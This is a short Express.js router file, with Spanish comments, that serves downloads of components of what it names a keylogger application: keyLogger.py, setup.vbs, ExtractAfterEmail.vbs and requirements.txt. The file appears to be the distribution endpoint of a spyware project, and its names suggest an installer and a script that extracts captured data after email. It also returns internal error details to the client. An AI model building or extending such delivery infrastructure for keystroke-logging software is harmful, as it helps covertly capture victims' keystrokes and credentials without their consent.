import express from 'express';
import { fileURLToPath } from 'url';
import fs from 'fs';
import path from 'path';

const router = express.Router();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Función para resolver la ruta del archivo
const resolveFilePath = (fileName) => {
    let currentDir = path.dirname(__filename); 
    let appDir = currentDir.replace('server', 'App');
    appDir = appDir.replace('Routes', '');
    console.log('appDir :', appDir);

    let filePath = fileName == 'ExtractAfterEmail.vbs'
        ? path.join(appDir, 'Utils', fileName)
        : path.join(appDir, fileName);

   console.log('filePath :', filePath);

   return filePath;
};

// Ruta para archivos en App
router.get('/KeyLoggerApp/:fileName', (req, res) => {
    const fileName = req.params.fileName;
    const validFiles = ['keyLogger.py', 'setup.vbs', 'ExtractAfterEmail.vbs', 'requirements.txt'];

    if (!validFiles.includes(fileName)) {
        return res.status(400).send('Invalid file name');
    }

    const filePath = resolveFilePath(fileName);

    const fileStream = fs.createReadStream(filePath);

    fileStream.on('error', (error) => {
        console.error(`Error reading file ${filePath}: ${error.message}`);
        res.status(500).send(`Internal Server Error: ${error.message}`);
    });

    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    fileStream.pipe(res);
});


export default router;